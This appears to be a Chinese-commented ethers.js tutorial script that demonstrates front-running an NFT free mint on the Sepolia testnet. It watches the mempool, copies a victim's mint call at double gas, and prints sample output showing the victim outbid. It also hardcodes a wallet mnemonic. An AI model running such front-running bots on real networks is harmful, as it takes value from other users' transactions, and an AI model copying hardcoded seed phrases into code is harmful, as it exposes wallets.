/**
 * 用一个账号部署 NFT 合约并 mint，
 * 另一个账户使用 ethers 监听 mint 并抢跑
 */
// 下面 solidity 代码复制到 remix 中会自动安装依赖
// pragma solidity ^0.8.4;
// import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
// // 我们尝试frontrun一笔Free mint交易
// contract FreeMint is ERC721 {
//     uint256 public totalSupply;
//     // 构造函数，初始化NFT合集的名称、代号
//     constructor() ERC721("Free Mint NFT", "FreeMint") {}
//     // 铸造函数
//     function mint() external {
//         totalSupply++;
//         _mint(msg.sender, totalSupply); // mint
//     }
// }

// 1. node 23-抢先交易.js
// 2. 用另一个钱包 mint
// 3. 下面代码会监听到，付出 2 倍 gas 抢跑
// 4. 比用钱包 mint 更早被打包进区块，例如下面获得 4 NFT优先 mint 权

import { ethers } from 'ethers';
// 注意公共节点可能不更新或失效
// https://chainlist.org/chain/11155111 可以替换最新的可以接口用来测试
const SEPOLIA_URL = 'wss://ethereum-sepolia-rpc.publicnode.com';
const provider = new ethers.WebSocketProvider(SEPOLIA_URL);
const mnemonic =
  'metal cereal clump disagree sight recall catch they fire diagram swallow nurse';
const hdNode = ethers.HDNodeWallet.fromPhrase(mnemonic);
const wallet = new ethers.Wallet(hdNode.privateKey, provider);

//2.构建contract实例
const contractABI = [
  'function mint() external',
  'function ownerOf(uint256) public view returns (address)',
  'function totalSupply() view returns (uint256)',
];

const contractAddress = '0x57CdA534edf5f432193e210D365d82FC9D509F7A'; //合约地址
const contractFM = new ethers.Contract(contractAddress, contractABI, provider);

const iface = new ethers.Interface(contractABI);
function getSignature(fn) {
  return iface.getFunction(fn).selector;
}

provider.on('pending', async (txHash) => {
  const tx = await provider.getTransaction(txHash);
  if (
    tx &&
    tx.to === contractAddress &&
    tx.data.includes(getSignature('mint')) &&
    tx.from !== wallet.address
  ) {
    console.log(
      `[${new Date().toLocaleTimeString()}]监听到交易: ${txHash}\n准备抢先交易`
    );
    const frontRunTx = {
      to: tx.to,
      value: tx.value,
      maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 2n,
      maxFeePerGas: tx.maxFeePerGas * 2n,
      gasLimit: tx.gasLimit * 2n,
      data: tx.data,
    };
    const aimTokenId = (await contractFM.totalSupply()) + 1n;
    console.log(`即将被 mint 的 NFT 编号是: ${aimTokenId}`); //打印应该被mint的nft编号
    const sentFR = await wallet.sendTransaction(frontRunTx);
    console.log(`正在 frontrun 交易`);
    const receipt = await sentFR.wait();
    console.log(`frontrun 交易成功,交易 hash 是: ${receipt.hash}`);
    console.log(`铸造发起的地址是: ${tx.from}`);
    console.log(
      `编号 ${aimTokenId} NFT 的持有者是: ${await contractFM.ownerOf(
        aimTokenId
      )}`
    );
    // 刚刚 mint 的 nft 持有者并不是 tx.from
    console.log(
      `编号 ${aimTokenId + 1n} 的 NFT 的持有者是: ${await contractFM.ownerOf(
        aimTokenId + 1n
      )}`
    );
    // tx.from 被 wallet.address 抢跑，mint 了下一个 nft
    console.log(
      `铸造发起的地址是不是对应 NFT 的持有者: ${
        tx.from === (await contractFM.ownerOf(aimTokenId))
      }`
    );
    // 比对地址，tx.from 被抢跑
    // 检验区块内数据结果
    const block = await provider.getBlock(tx.blockNumber);
    console.log(`区块内交易数据明细: ${block.transactions}`); //在区块内，后发交易排在先发交易前，抢跑成功。
  }
});

// [4:57:07 PM]监听到交易: 0xc1742f76096514cf1b6d661e63bbc967c30efb6218617f152c1d6530c78173c1
// 准备抢先交易
// 即将被 mint 的 NFT 编号是: 4
// 正在 frontrun 交易
// frontrun 交易成功,交易 hash 是: 0xd691fea71c14dc6f2797088bba2d3b503bbb9bdbd8cc5cd5828fe3f5a04229c1
// 铸造发起的地址是: 0xD7FB63E49E9b387d9c22B97fEcAcf996100A37b8
// 编号 4 NFT 的持有者是: 0x3cf9a3265E00cfBda31bcFb90a11a684861d0E37
// 编号 5 的 NFT 的持有者是: 0xD7FB63E49E9b387d9c22B97fEcAcf996100A37b8
// 铸造发起的地址是不是对应NFT的持有者: false
// 区块内交易数据明细:0x6fd65206429e2f7264980386c54d2ea4fc5c5af4115f60...
